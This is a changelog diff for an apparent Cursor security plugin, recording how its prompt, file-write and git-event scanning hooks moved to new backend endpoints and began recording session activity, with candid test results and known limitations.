+`persistScanResult`/`mergeScanIntoOpenTurn`, `recordTurnHandler`'s
+update-in-place path) and the `Source` field being populated on every
+plugin-hooks chatapi document (previously left at its zero value) are
+covered by control-server's own Go test suite — see that repo's history for
+this same date.
+
+## 2026-09-21 — Scan via the composite PromptGuard+PolicyEngine+CDS endpoint
+
+`check-prompt.sh`/`check-write.sh` now scan through control-server's new
+`POST /api/v1/plugin/codechain/sessions/{id}/scan` instead of calling
+`POST /api/v1/codedefense/scan` directly. That closes the gap the interim
+CDS-only design (2026-09-21, below) deliberately left open: PromptGuard
+(jailbreak) and PolicyEngine (DLP/PII) coverage that the original
+`/v1/messages` pipeline used to provide, and which the CDS-only scan never
+replicated, is now run again — server-side, gated by the org's policy
+configuration, in the same PG → PolicyEngine → CDS order and
+worst-result-wins logic the real gateway pipeline uses.
+
+This is also the first time a *scan* call joins Code Chain: the new
+endpoint requires a SessionId (Cursor's `conversation_id`, same as every
+other plugin-hooks call) and persists a chatapi document tagged with it,
+so a block/warn/allow decision now shows up in the session's Code Chain
+history the same way a real gateway `GatewayBlock` does — the CDS-only
+endpoint had no session concept and recorded nothing.
+
+What changed:
+- `lib/scan-client.sh`/`.ps1`: `pn_scan_text`/`Invoke-PnScanText` now POST
+  JSON (not multipart form data) to the session-scoped scan endpoint, and
+  require `session_id`/`cwd`/`git_repo_url`/`git_branch` as new leading
+  parameters. New `no_session`/`"no_session"` status for the (not expected
+  in practice, but handled) case where a hook payload carries no
+  `conversation_id`.
+- `check-prompt.sh`/`.ps1`, `check-write.sh`/`.ps1`: now extract
+  `conversation_id`/`cwd` from the hook payload and derive git context
+  from `cwd` (same `lib/git-utils.*` pattern every other hook here already
+  uses), and pass all of it through to the scan call. A new `no_session`
+  failure branch mirrors the existing timeout/unreachable/http_error/
+  invalid_json branches (FAILURE_MODE-gated, audit-logged on the write
+  side).
+- `test/test-scan-client.sh` rewritten for the new signature and JSON
+  transport (mocks `http_post_json` instead of `http_post_multipart_form`).
+
+Verified: `bash test/run-all-tests.sh` — 203/204 passing (the one failure,
+`check-repo-context.sh`'s sanitized-GIT-tag assertion, reproduces
+identically without this change — confirmed unrelated, pre-existing).
+`shellcheck -S warning -x scripts/*.sh scripts/lib/*.sh` reports only the
+same pre-existing SC2034 global-return pattern already established for
+this codebase. **PowerShell changes were not executed or tested** —
+`pwsh`/`Invoke-ScriptAnalyzer` are unavailable in this environment; reviewed
+by hand against the `.sh` twin for structural/logical parity instead.
+
+## 2026-09-21 — Fix turn recording: was wired to "stop", which never fires per-turn
+
+Live testing found that prompts sent through Cursor were never landing in
+Code Chain at all — `~/.paradigm-scanner/codechain-client.log` stayed empty
+across multiple real prompts, even after confirming the recording pipeline
+itself worked end-to-end (a synthetic payload posted successfully and got a
+204 back). Checked Cursor's hooks docs directly
+(`cursor.com/docs/agent/hooks`) rather than continuing to guess: `stop`
+fires when **the whole agent loop ends** — payload is just `{status,
+loop_count}`, no response text, no reliable per-turn timing — not once per
+completed turn as this repo's design doc had assumed (hedged as
+"`afterAgentResponse`/`stop`" without picking one). `afterAgentResponse` is
+the hook that actually fires once per completed assistant message, and its
+payload carries the final assistant text directly (`.text`).
+
+What changed:
+- `hooks/hooks.json`: retargeted the `check-turn-complete` entry from
+  `"stop"` to `"afterAgentResponse"`.
+- `check-turn-complete.sh`/`.ps1`: now reads `.text` from the payload as
+  the authoritative Response (falls back to the transcript-derived guess
+  only if `.text` is empty). The Prompt still has to be recovered from
+  `.transcript_path` — `afterAgentResponse` carries no prompt field of its
+  own, unlike `beforeSubmitPrompt`. No cross-hook correlation state (no
+  stash file mapping prompt-by-generation_id) was introduced; this keeps
+  the existing transcript-based approach for the prompt half only.
+- `design-ideas/Codechain_Plugin_Hooks_Design.md` updated to firmly state
+  `afterAgentResponse` as the confirmed, correct trigger everywhere it had
+  been hedged as "`afterAgentResponse`/`stop`".
+
+**Known limitation, not resolved here:** Cursor's docs describe
+`afterAgentResponse` as firing "after the agent has completed an assistant
+message" — if a single user turn produces more than one assistant message
+(e.g. several tool-call round-trips before a final answer), this could
+record more than one turn per user prompt. Not reproduced or ruled out;
+revisit if duplicate/fragmented turns show up in `chatapi`.
+
+Verified: manually invoked `check-turn-complete.sh` directly three times
+with crafted `afterAgentResponse`-shaped payloads (text-field takes
+precedence over a deliberately-different transcript response; falls back
+to the transcript when `.text` is absent; no-ops cleanly with no
+`conversation_id`) — each confirmed via `~/.paradigm-scanner/codechain-
+client.log`. No new automated test coverage was added for
+`check-turn-complete.sh` itself: the underlying HTTP call
+(`pn_record_codechain_turn`) is already covered by
+`test/test-codechain-client.sh`, and this script can't be sourced into
+that suite (it calls `exit 0` at its own top level) without standing up
+new mock-server infrastructure for the `/turns` endpoint — judged
+disproportionate for a purely observational recording path given the
+manual verification above. `bash test/run-all-tests.sh` — 198/199 passing
+(the one failure is the pre-existing unrelated `check-repo-context.sh`
+flake). `shellcheck -S warning -x scripts/check-turn-complete.sh` clean.
+
+Separately confirmed the same root cause explains why git push/commit
+scanning wasn't firing either: `beforeShellExecution` was also added on
+this branch and is still unregistered in the currently-loaded Cursor
+plugin instance — not a code bug, but this repo's local-plugin-install
+docs don't yet cover "newly-added hook types need a full plugin
+remove/re-add, not just Reload Window." Not fixed here (nothing to fix in
+this repo); flagged for a `LOCAL_TESTING.md` follow-up.
+
+## 2026-09-21 — Stop minting a separate SessionId for Code Chain recording
+
+`lib/codechain-client.sh`/`.ps1` no longer register-and-cache a
+server-minted `SessionId` before recording turns/shell-events. The control-
+server side dropped its `plugin_codechain_sessions` collection (which
+existed only to mint an id and look up `Platform`/`Cwd`/`GitRepoUrl`/
+`GitBranch` on every write) in favor of using Cursor's own
+`conversation_id` directly as the SessionId — the same pattern every other
+vendor here already used (Claude Code's `X-Claude-Code-Session-Id` header,
+Cursor gateway mode's `cursorConversationId`). There was nothing left for a
+dedicated session collection, or a client-side local cache mapping
+conversation id → minted id, to do.
+
+What changed:
+- `pn_get_codechain_session_id`/`Get-CodechainSessionId` (the mint-or-reuse
+  call, backed by a `~/.paradigm-scanner/codechain-sessions/*.txt` file
+  cache) is gone, along with `sanitize_client_session_id`/
+  `_codechain_cache_*`/`Get-SanitizedClientSessionId`/`Get-CodechainCache*`.
+- New `pn_register_codechain_session`/`Register-CodechainSession` records a
+  session-start marker directly against the client's own session id — it
+  is independent of every other call below, not a prerequisite for them.
+- `pn_record_codechain_turn`/`Send-CodechainTurn` and
+  `pn_record_codechain_shell_event`/`Send-CodechainShellEvent` now take
+  `Cwd`/`GitRepoUrl`/`GitBranch` directly as parameters (previously looked
+  up server-side from the registered session) — the callers already
+  compute these locally on every hook invocation, so nothing new had to be
+  threaded through.
+- `pn_close_codechain_session`/`Close-CodechainSession` posts to the given
+  session id directly; no more cache lookup to find what to close.
+- `check-session.sh`/`.ps1`, `check-turn-complete.sh`/`.ps1`,
+  `check-git-event-record.sh`/`.ps1` updated to call these directly instead
+  of a lookup-then-record two-step. `check-session-end.sh`/`.ps1` barely
+  changed (it already passed the client's own session id through).
+
+Verified: `bash test/run-all-tests.sh` — 198/199 passing (Code Chain
+Recording Tests 22/22; the one failure, `check-repo-context.sh`'s
+sanitized-GIT-tag assertion, reproduces identically without this change —
+confirmed unrelated, pre-existing). `test/test-codechain-client.sh`
+rewritten to match (no more cache-hit/miss cases — there is no cache left).
+`shellcheck -S warning -x scripts/*.sh scripts/lib/*.sh` reports only the
+same pre-existing SC2034 pattern already established for this codebase's
+global-return convention, none of it in `codechain-client.sh`.
+
+Also updated `design-ideas/Codechain_Plugin_Hooks_Design.md`'s `POST
+/sessions` section to match — it previously documented a server-minted
+`SessionId` returned from a `ClientSessionId` idempotency key.
+
+## 2026-09-21 — Move prompt/write scanning off /v1/messages onto POST /api/v1/codedefense/scan
+
+`check-prompt.sh`/`check-write.sh` (+ `.ps1` twins) no longer call
+`/v1/messages` at all. That route required invoking a real, billed model
+completion just to get a scan verdict — every scanned prompt was answered
+twice (once for real by Cursor, once more by the Paradigm-configured model
+purely to produce something to classify), and the reverse-engineered
+verdict heuristic (`pn_parse_messages_response`, "zero usage + a
+`REQUEST BLOCKED` banner") was an admitted stopgap with no real structured
+field behind it. They now call the existing `POST /api/v1/codedefense/scan`
+(via new `lib/scan-client.sh`/`.ps1`) — no model invocation, and a real
+`action_to_take: allow|warn|block` field instead of a heuristic.
+
+**Interim step, not the final design**: this calls Code Defense Service
+only. The full `/v1/messages` pipeline also ran PromptGuard (jailbreak) and
+PolicyEngine (DLP/PII) — those are *not* replicated by this change yet.
+A composite backend endpoint that triggers PromptGuard + PolicyEngine + CDS
+together, based on the org's policy configuration, is the planned follow-up
+(PN-11847) — deliberately scoped to reuse the one endpoint that already
+exists today rather than the plugin calling three separate policy
+endpoints itself.
+
+What changed:
+- New `lib/scan-client.sh`/`.ps1` (`pn_scan_text`/`Invoke-PnScanText`):
+  posts `text` as multipart form data, returns a real `Status`/`Action`
+  pair instead of a parsed heuristic.
+- `check-prompt.sh`/`check-write.sh` (+ `.ps1`) rewritten to call it.
+  FAILURE_MODE/PROMPT_FAILURE_MODE semantics, audit logging, the
+  anomaly-streak staleness tracking, and all user-facing message branding
+  are unchanged — only the transport and verdict source changed. Dropped
+  the `/v1/messages`-specific HTTP-403 "complete your setup" special case
+  (tied to that route's own error behavior, not confirmed to apply to the
+  new endpoint) and the `MODEL`/`MAX_TOKENS` request parameters (CDS
+  resolves the org's configured scanning model server-side; the caller
+  doesn't choose one).
+- Removed the now-fully-dead `pn_parse_messages_response`/
+  `pn_strip_block_banner` (`lib/common.sh`) and their PowerShell mirrors
+  (`ConvertFrom-PnMessagesResponse`/`ConvertTo-PnStrippedBlockBanner`,
+  `Invoke-MessagesHttpPost`), plus their ~14 dedicated unit tests — these
+  had no other callers once check-prompt/check-write stopped using them.
+- `PARADIGM_NETWORKS_SCAN_URL_OVERRIDE` is gone — there was no equivalent
+  override wired for the new endpoint; nothing else referenced it.
+
+**Discovered, not fixed by this change**: `pn_resolve_model`/
+`Resolve-PnModel` and the two skills built on it
+(`paradigmnetworks-models`/`set-model`) are now orphaned — nothing consumes
+the saved "preferred model" for scanning anymore, since CDS takes no model
+parameter from the caller. Left in place pending a decision on whether to
+remove them.
+
+Verified: `bash test/run-all-tests.sh` — 197/198 passing (the one failure,
+`check-repo-context.sh`'s sanitized-GIT-tag assertion, reproduces
+identically on a version of this branch without this change — confirmed
+unrelated). New `test/test-scan-client.sh` (14 tests) covers `pn_scan_text`
+directly (allow/warn/block/anomaly/timeout/unreachable/http-error/
+invalid-json, and URL construction). `shellcheck -S warning -x scripts/*.sh
+scripts/lib/*.sh` reports only the same pre-existing SC2034 pattern already
+established for this codebase's global-return convention — the new
+`PN_SCAN_*` globals follow it, not a new problem.
+
+## 2026-09-21 — Record Code Chain sessions/turns/commits from Cursor Hooks (PN-11880)
+
+Adds a second, independent concern alongside the existing gating pipeline
+(`/api/v1/detections/evaluate`): recording plugin-mode activity into Code
+Chain, control-server's session/commit/PR traceability system. Until now,
+plugin-mode Cursor sessions produced zero Code Chain visibility — confirmed
+directly during this design work: `lib/detection-client.sh` always sends an
+empty `SessionId`, and control-server's `committranscripts.ProcessPersistedRequest`
+bails on an empty `SessionId` before any detection runs, regardless of scan
+outcome. See `design-ideas/Codechain_Plugin_Hooks_Design.md` for the full
+design and control-server's matching `PN-11880` branch.
+
+Four new hook wirings in `hooks/hooks.json`, each calling a new shared
+client, `lib/codechain-client.sh`/`.ps1`:
+
+- `sessionStart` (extended `check-session.sh`/`.ps1`): best-effort registers
+  a Code Chain session against control-server's new
+  `POST /api/v1/plugin/codechain/sessions`, keyed on Cursor's own
+  `conversation_id`. Backgrounded (a PowerShell `Start-Job`, a bash `&`) so
+  it never delays the existing login-check message, this hook's real job.
+- `sessionEnd` (new `check-session-end.sh`/`.ps1`, a hook event this plugin
+  did not previously use at all): finalizes the session via
+  `POST .../sessions/{id}/close`.
+- `afterShellExecution` (new `check-git-event-record.sh`/`.ps1`, three new
+  matchers mirroring the existing `beforeShellExecution` ones): records the
+  git push/commit/`gh pr create` command's OUTPUT once it has actually run.
+  Deliberately NOT added to `check-git-event.sh` itself — that hook fires
+  BEFORE execution and only ever sees the command text, never the commit
+  SHA/push confirmation/PR URL control-server's detection regex needs, so
+  recording needed its own `afterShellExecution` hook rather than piggy-
+  backing on the existing gate.
+- `stop` (new `check-turn-complete.sh`/`.ps1`, another previously-unused
+  hook event): records the completed turn (prompt + response) via
+  `POST .../sessions/{id}/turns`. Reads Cursor's own `transcript.jsonl`
+  through a new role-separating extractor, `get_current_turn_messages`/
+  `Get-CurrentTurnMessages` (`lib/common.sh`/`.ps1`) — a sibling to the
+  existing `get_current_turn_text`, which blends prompt and response into
+  one string; Code Chain's turn payload needs them kept separate.
+
+Session identity is cached locally per `conversation_id`
+(`~/.paradigm-scanner/codechain-sessions/`, atomic writes) so only the
+first hook of a session pays the registration round-trip — every later
+hook call for the same conversation reads the cached, server-minted
+`SessionId`. Registration is itself idempotent server-side, so a cache miss
+racing a concurrent hook call is harmless.
+
+Every function in `lib/codechain-client.sh`/`.ps1` is unconditionally
+best-effort: a registration/recording failure is logged
+(`~/.paradigm-scanner/codechain-client.log`) and swallowed, never surfaced
+in a hook's returned JSON or exit code — this is a genuinely different
+contract from the existing gating hooks (`check-prompt.sh`, `check-write.sh`,
+`check-git-event.sh`), which must return a real allow/deny verdict. Recording
+and gating are deliberately kept as separate calls from
+`check-git-event-record.sh`/`check-git-event.sh` rather than merged into one,
+so a recording failure can never affect a gating decision and vice versa.
+
+Verified: `bash test/run-all-tests.sh` — 183/184 passing (the one failure,
+`check-repo-context.sh`'s sanitized-GIT-tag assertion, reproduces identically
+on the unmodified baseline via `git stash`, confirmed unrelated to this
+change). `shellcheck -S warning -x scripts/*.sh scripts/lib/*.sh` reports the
+same pre-existing SC2034 warning pattern already present on the baseline for
+this codebase's established global-return convention (`PN_MSG_ACTION`,
+`HTTP_POST_BODY`, etc.) — the three new globals this change adds
+(`PN_CODECHAIN_SESSION_ID`, `PN_TURN_PROMPT`, `PN_TURN_RESPONSE`) follow the
+same, already-tolerated pattern, not a new regression. PowerShell side
+written to mirror the bash implementation function-for-function but not yet
+run under a live Windows target or Pester — flagged as a follow-up
+verification step, consistent with this repo's existing, thinner Pester
+coverage (see `CLAUDE.md`).
+
+## 2026-09-17 — Added git push/commit/PR-create governance via a new `beforeShellExecution` hook
+
+Adds `scripts/check-git-event.sh`/`.ps1`, wired into three new
+`beforeShellExecution` matchers in `hooks/hooks.json` (`git push`, `git
+commit`, `gh pr create`). Unlike the existing prompt/write hooks, this calls
+a new backend endpoint, `POST /api/v1/detections/evaluate` (control-server),
+a generic command/event detection contract designed to be extensible to a
+future non-git command source without a contract change (see
+`design-ideas/Cursor_PrePush_Governance_Enforcement_Plan.md`, section 0.5,
+for the full design). One script is parameterized by `EventType`
+(`git.push`/`git.commit`/`git.pr_create`) rather than three near-duplicate
+scripts, since only the file-collection step differs per event:
+
+- `git.push`/`git.pr_create` diff against, respectively, "everything not
+  reachable from any remote branch" and "the PR's base branch" -- these are
+  genuinely different comparisons, not interchangeable: a branch already
+  pushed before `gh pr create` runs (the common flow) has every commit
+  already on a remote branch, so the push-style "not on any remote"
+  comparison finds nothing to scan at exactly the moment a PR is about to
+  open. Confirmed directly with a real push-then-create-PR scenario before
+  landing on the base-branch-diff approach for PR creation.
+- `git.commit` scans the git index (staged changes), since
+  `beforeShellExecution` fires before the commit exists to diff against.
+- Binary files are filtered out before submission (`is_binary_file` in the
+  new `lib/detection-client.sh`) -- an LLM-based scanner has no meaningful
+  use for one. The first implementation of this check compared a
+  `head -c`-captured sample against a NUL-stripped copy of itself as bash
+  string variables; caught by the new unit test suite before it shipped,
+  since bash strings are NUL-terminated C strings internally and command
+  substitution silently truncates at the first NUL -- both copies came out
+  identically truncated and the check never actually detected a NUL.
+  Rewritten to use `grep -I` (present in both BSD and GNU grep), which
+  operates on the file directly rather than routing bytes through a shell
+  variable.
+- A file-count/total-size guardrail (`PARADIGM_NETWORKS_GIT_EVENT_MAX_FILES`/
+  `_MAX_BYTES`, default 60 files / 8 MB) caps the fan-out submitted for one
+  push/commit/PR, since no measured latency benchmark exists yet for how
+  many parallel scanner calls one submission can trigger -- see the design
+  doc's section 9. Content sent is each file's current working-tree state,
+  not an exact historical/staged blob -- a deliberate simplification (the
+  two coincide in the common case, and the alternative adds real complexity
+  for a race that exists regardless of which content source is picked).
+- Defaults fail-**closed** (`PARADIGM_NETWORKS_FAILURE_MODE=block`), matching
+  `check-write.sh`'s posture, not `check-prompt.sh`'s fail-open default: a
+  push/commit/PR reaching its destination unscanned is a comparable risk to
+  an unscanned file write.
+- `GitRepoUrl`/`GitBranch` sent with each request reuse the existing
+  `sanitize_git_value` (credential-stripping) treatment from
+  `lib/git-utils.sh`; two new `_or_empty` variants were added there since the
+  existing `get_remote_url`/`get_current_branch` intentionally return
+  human-readable placeholder text ("No remote"/"detached") for a different
+  caller (`check-repo-context.sh`)'s context injection, which the API
+  contract's "empty means not applicable" requirement does not want.
+- `scripts/run-hook.cmd`'s `/bin/sh` line was fixed to forward extra
+  arguments (`shift; exec bash "$d/$n.sh" "$@"`, previously just
+  `exec bash "$d/$1.sh"` with no forwarding at all) -- needed so
+  `run-hook.cmd check-git-event git.push` actually delivers the event-type
+  argument through on macOS/Linux; the Windows batch side already forwarded
+  `%2..%9` and needed no change.
+- Verified: 34 new tests in `test/test-git-event.sh` (git-utils resolvers
+  against real throwaway git repos, `pn_evaluate_detection`'s HTTP-status/
+  response-shape classification via a narrow test-only override of
+  `http_post_multipart_form`, and `check-git-event.sh`'s allow/deny paths),
+  wired into `test/run-all-tests.sh`. `test/mock-server.sh` gained
+  `detections_allow`/`detections_warn`/`detections_block` response modes
+  for the new endpoint's response shape, alongside its existing
+  `/v1/messages`-shaped modes.
+
 ## 2026-09-14 — Two real bugs found testing on an actual Windows dev-account machine
 
 - **`.ps1` files with a literal non-ASCII character (emoji, em dash) failed
